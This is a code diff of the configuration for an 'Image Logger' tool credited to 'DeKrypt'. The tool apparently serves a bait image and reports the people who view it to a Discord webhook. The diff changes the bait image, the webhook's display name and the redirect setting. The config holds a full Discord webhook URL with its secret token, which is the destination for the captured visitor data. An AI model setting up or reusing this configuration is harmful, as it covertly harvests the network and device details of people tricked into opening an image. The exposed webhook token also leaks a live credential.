@@ -14,12 +14,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1335006655192104970/ZjOBtFJPDnt99WLXKPniNWzTIc_2zIIBDAww5r-txq7sAOaoGtlfTV-E9h4UVDmiDrM3",
-    "image": "https://static1.cbrimages.com/wordpress/wp-content/uploads/2021/02/rickroll-header.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://pbs.twimg.com/media/GOdQpjWXUAARMUX.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Bonjour Maitre Kagami", # Set this to the name you want the webhook to have
+    "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -51,8 +51,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://www.youtube.com" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
